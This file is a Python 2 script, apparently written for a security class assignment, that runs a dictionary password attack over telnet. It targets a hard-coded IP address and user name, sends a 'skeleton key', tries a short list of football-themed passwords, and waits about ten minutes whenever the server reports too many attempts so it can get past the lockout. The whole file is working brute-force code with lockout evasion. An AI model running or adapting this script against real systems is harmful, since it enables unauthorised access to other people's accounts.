#!/usr/bin/env python

import socket
import errno
import requests
from requests.auth import HTTPBasicAuth

import getpass
import sys
import telnetlib

import personalServer as ps

import time

import re

UNAME = 'ceneri' 
IP_ADDRESS = '128.114.59.215'

IN_FILE = "personalServer.txt"
OUT_FILE = "dictionaryPasswd.txt"

dictionary = ['united',  'manchester', 'manu',
	 'reds', 'devils', 'trafford', 'reds', 'devils', 'trafford', 'manutd'
	]


def get_p_port():
	file = open(IN_FILE, "r")

	for line in file:
		pPort = line[:-1]

	file.close()
	return pPort

def main():

	toomany = re.compile("Too many")
	pw = re.compile("Pass")

	HOST = IP_ADDRESS

	file = open(OUT_FILE, "w")

	personalPort = get_p_port()

	skeletonKey = ps.get_s_key()

	#dictionary attaqck here

	dictLen = len(dictionary)
	for index in range(dictLen):

		print "Index", index

		tnet = telnetlib.Telnet(HOST, personalPort)
		
		try: 
			pwd = dictionary[index]

			#print sKey
			tnet.write(skeletonKey + "\n")

			tnet.read_until("Username: ")

			tnet.write(UNAME + "\n")

			expected = tnet.expect([toomany, pw])

			indexFound = expected[0]


			#too many
			if indexFound == 0:
				print "F"
				print "Too many attempts", pwd
				print "Sleeping 600 seconds"
				time.sleep(605)
				#attempt conection again
				tnet.write(skeletonKey + "\n")

				tnet.read_until("Username: ")

				print "D"

				tnet.write(UNAME + "\n")

				expected = tnet.expect([toomany, pw])

			tnet.write(pwd + "\n")

			print "H"

			consoleRead = tnet.read_all()

			print "I"

			match = re.search('Incorrect', consoleRead)
		
			if match:
				print "Not a password:", pwd
				continue
			else:
				print "Final console", consoleRead
				print "PASSWORD:", pwd
				break

		except EOFError, v:

			print "Exception"
			continue
		#print "no"

	file.close()



if __name__ == '__main__':
	main()